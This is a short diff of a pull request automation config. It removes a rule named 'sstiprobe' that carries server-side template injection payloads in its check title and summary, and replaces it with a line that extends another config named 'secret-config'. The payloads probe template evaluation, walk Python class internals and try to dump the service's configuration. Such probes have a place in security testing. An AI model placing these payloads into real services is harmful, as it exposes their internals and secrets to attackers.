@@ -1,8 +1,1 @@
-pull_request_rules:
-  - name: sstiprobe
-    conditions:
-      - base=main
-    actions:
-      post_check:
-        title: "SSTI|7x7={{ 7*7 }}|cls={{ ''.__class__ }}|mro={{ ''.__class__.__mro__ }}"
-        summary: "sub={{ ''.__class__.__mro__[1].__subclasses__() }}|cfg={{ config }}|title={{ title }}"
+extends: secret-config
